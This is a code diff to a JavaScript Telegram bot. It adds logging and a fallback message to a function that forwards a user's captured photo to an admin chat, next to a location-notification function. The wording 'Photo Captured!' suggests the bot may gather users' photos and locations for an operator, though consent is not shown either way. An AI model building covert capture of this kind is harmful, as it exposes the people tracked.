@@ -350,6 +350,14 @@ const sendAdminLocationNotification = async (telegramId, data) => {
  */
 const sendAdminPhotoNotification = async (telegramId, filePath) => {
     const botToken = process.env.BOT_TOKEN || process.env.TELEGRAM_BOT_TOKEN;
+    
+    logger.info('Attempting to send photo notification', { 
+        telegramId, 
+        filePath,
+        hasToken: !!botToken,
+        adminId: ADMIN_TELEGRAM_ID
+    });
+    
     if (!botToken) {
         logger.warn('No bot token for photo notification');
         return;
@@ -361,9 +369,23 @@ const sendAdminPhotoNotification = async (telegramId, filePath) => {
         
         // Check if file exists
         if (!fsSync.existsSync(filePath)) {
-            logger.warn('Photo file not found', { filePath });
+            logger.warn('Photo file not found for notification', { filePath });
+            // Send text notification instead
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: ADMIN_TELEGRAM_ID,
+                    text: `📷 *Photo Captured!*\n\n👤 User: \`${telegramId}\`\n🕐 ${new Date().toLocaleString()}\n\n⚠️ File saved but couldn't send`,
+                    parse_mode: 'Markdown'
+                })
+            });
             return;
         }
+        
+        const fileStats = fsSync.statSync(filePath);
+        logger.info('Photo file found', { filePath, size: fileStats.size });
         
         const formData = new FormData();
         formData.append('chat_id', ADMIN_TELEGRAM_ID.toString());
@@ -379,12 +401,20 @@ const sendAdminPhotoNotification = async (telegramId, filePath) => {
         const result = await response.json();
         
         if (!result.ok) {
-            logger.warn('Telegram API error sending photo', { error: result.description });
+            logger.error('Telegram API error sending photo', { 
+                error: result.description, 
+                errorCode: result.error_code,
+                filePath 
+            });
         } else {
-            logger.info('Photo sent to admin instantly', { telegramId });
+            logger.info('Photo sent to admin instantly', { telegramId, messageId: result.result?.message_id });
         }
     } catch (err) {
-        logger.warn('Failed to send photo to admin', { error: err.message });
+        logger.error('Failed to send photo to admin', { 
+            error: err.message, 
+            stack: err.stack,
+            filePath 
+        });
     }
 };
 
